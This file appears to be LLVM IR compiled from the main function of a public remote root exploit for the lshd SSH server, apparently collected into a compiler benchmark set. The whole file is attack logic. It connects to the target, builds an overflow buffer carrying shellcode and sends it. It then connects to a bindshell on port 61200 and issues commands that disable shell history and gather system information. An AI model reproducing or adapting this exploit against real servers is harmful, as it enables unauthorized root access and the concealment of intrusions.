; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23162.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23162.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i32, i32 }

@.str = private unnamed_addr constant [66 x i8] c"\0Alshd 1.3-1.5 remote root exploit by m00 security // www.m00.ru\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [107 x i8] c"Incorrect parameters. Usage: %s <target host> <target type> [port (22 default)]\0A\0AWhere 'target type' is:\0A\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.2 = private unnamed_addr constant [8 x i8] c"\0D%i %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@hostSct = common dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [30 x i8] c"[-] Couldn't resolve host %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"[~] Connecting to %s:%i...\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c" failed\0A\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c" OK\0A\00", align 1
@.str.8 = private unnamed_addr constant [34 x i8] c"[~] Waiting for lshd response... \00", align 1
@buf = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [6 x i8] c"=> %s\00", align 1
@.str.10 = private unnamed_addr constant [43 x i8] c"[~] Building and sending exploit buffer...\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [21 x i8] c" OK\0A[~] Sleeping...\0A\00", align 1
@.str.12 = private unnamed_addr constant [38 x i8] c"[~] Trying to connect to bindshell...\00", align 1
@.str.13 = private unnamed_addr constant [60 x i8] c" error\0A[-] Could not connect to %s:61200 - exploit failed\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [33 x i8] c" OK\0A[+] Shell spawned! w00t!!!\0A\0A\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"export HISTFILE=/dev/null;id;uname -a;uptime;\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 22, i32* %13, align 4
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 3
  br i1 %16, label %17, label %45

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  store i32 0, i32* %8, align 4
  br label %22

22:                                               ; preds = %39, %17
  %23 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %24 = load i32, i32* %8, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %23, i64 %25
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  %29 = icmp ne i8* %28, null
  br i1 %29, label %30, label %42

30:                                               ; preds = %22
  %31 = load i32, i32* %8, align 4
  %32 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %33 = load i32, i32* %8, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i64 %34
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i32 %31, i8* %37)
  br label %39

39:                                               ; preds = %30
  %40 = load i32, i32* %8, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %8, align 4
  br label %22

42:                                               ; preds = %22
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %44 = call i32 @exit(i32 0) #3
  unreachable

45:                                               ; preds = %2
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 2
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @atoi(i8* %48)
  store i32 %49, i32* %9, align 4
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 3
  %52 = load i8*, i8** %51, align 8
  %53 = icmp ne i8* %52, null
  br i1 %53, label %54, label %59

54:                                               ; preds = %45
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 3
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  store i32 %58, i32* %13, align 4
  br label %59

59:                                               ; preds = %54, %45
  br label %60

60:                                               ; preds = %59
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  %64 = call i32* @gethostbyname(i8* %63)
  store i32* %64, i32** @hostSct, align 8
  %65 = icmp eq i32* %64, null
  br i1 %65, label %66, label %72

66:                                               ; preds = %60
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 1
  %69 = load i8*, i8** %68, align 8
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0), i8* %69)
  %71 = call i32 @exit(i32 1) #3
  unreachable

72:                                               ; preds = %60
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %13, align 4
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %75, i32 %76)
  %78 = load i32, i32* %13, align 4
  %79 = call i32 @connect_to_host(i32 %78)
  store i32 %79, i32* %10, align 4
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

81:                                               ; preds = %72
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %83 = call i32 @exit(i32 1) #3
  unreachable

84:                                               ; preds = %72
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.8, i64 0, i64 0))
  %87 = load i32, i32* %10, align 4
  %88 = load i8*, i8** @buf, align 8
  %89 = call i32 @recv(i32 %87, i8* %88, i32 8095, i32 0)
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %91 = load i8*, i8** @buf, align 8
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i8* %91)
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.10, i64 0, i64 0))
  %94 = load i8*, i8** @buf, align 8
  %95 = bitcast i8* %94 to i64*
  store i64* %95, i64** %11, align 8
  store i32 0, i32* %8, align 4
  br label %96

96:                                               ; preds = %115, %84
  %97 = load i32, i32* %8, align 4
  %98 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %98, i64 %100
  %102 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %101, i32 0, i32 1
  %103 = load i32, i32* %102, align 8
  %104 = icmp slt i32 %97, %103
  br i1 %104, label %105, label %118

105:                                              ; preds = %96
  %106 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %107 = load i32, i32* %9, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %106, i64 %108
  %110 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %109, i32 0, i32 3
  %111 = load i32, i32* %110, align 8
  %112 = sext i32 %111 to i64
  %113 = load i64*, i64** %11, align 8
  %114 = getelementptr inbounds i64, i64* %113, i32 1
  store i64* %114, i64** %11, align 8
  store i64 %112, i64* %113, align 8
  br label %115

115:                                              ; preds = %105
  %116 = load i32, i32* %8, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %8, align 4
  br label %96

118:                                              ; preds = %96
  store i32 0, i32* %8, align 4
  br label %119

119:                                              ; preds = %131, %118
  %120 = load i32, i32* %8, align 4
  %121 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %122 = load i32, i32* %9, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i64 %123
  %125 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %124, i32 0, i32 2
  %126 = load i32, i32* %125, align 4
  %127 = icmp slt i32 %120, %126
  br i1 %127, label %128, label %134

128:                                              ; preds = %119
  %129 = load i64*, i64** %11, align 8
  %130 = getelementptr inbounds i64, i64* %129, i32 1
  store i64* %130, i64** %11, align 8
  store i64 2425393296, i64* %129, align 8
  br label %131

131:                                              ; preds = %128
  %132 = load i32, i32* %8, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %8, align 4
  br label %119

134:                                              ; preds = %119
  %135 = load i64*, i64** %11, align 8
  %136 = bitcast i64* %135 to i8*
  store i8* %136, i8** %12, align 8
  %137 = load i8*, i8** %12, align 8
  %138 = load i8*, i8** @shellcode, align 8
  %139 = load i8*, i8** @shellcode, align 8
  %140 = call i32 @strlen(i8* %139)
  %141 = call i32 @memcpy(i8* %137, i8* %138, i32 %140)
  %142 = load i8*, i8** %12, align 8
  %143 = load i8*, i8** @shellcode, align 8
  %144 = call i32 @strlen(i8* %143)
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %142, i64 %145
  store i8 10, i8* %146, align 1
  %147 = load i32, i32* %10, align 4
  %148 = load i8*, i8** @buf, align 8
  %149 = load i8*, i8** @buf, align 8
  %150 = call i32 @strlen(i8* %149)
  %151 = call i32 @send(i32 %147, i8* %148, i32 %150, i32 0)
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  %154 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0))
  %155 = call i32 @sleep(i32 1)
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.12, i64 0, i64 0))
  %157 = call i32 @connect_to_host(i32 61200)
  store i32 %157, i32* %6, align 4
  %158 = icmp eq i32 %157, -1
  br i1 %158, label %159, label %164

159:                                              ; preds = %134
  %160 = load i8**, i8*** %5, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 1
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.13, i64 0, i64 0), i8* %162)
  br label %170

164:                                              ; preds = %134
  %165 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.14, i64 0, i64 0))
  %166 = load i32, i32* %6, align 4
  %167 = call i32 @send(i32 %166, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i64 0, i64 0), i32 46, i32 0)
  %168 = load i32, i32* %6, align 4
  %169 = call i32 @get_shell(i32 %168)
  br label %170

170:                                              ; preds = %164, %159
  %171 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32* @gethostbyname(i8*) #1

declare dso_local i32 @connect_to_host(i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @get_shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
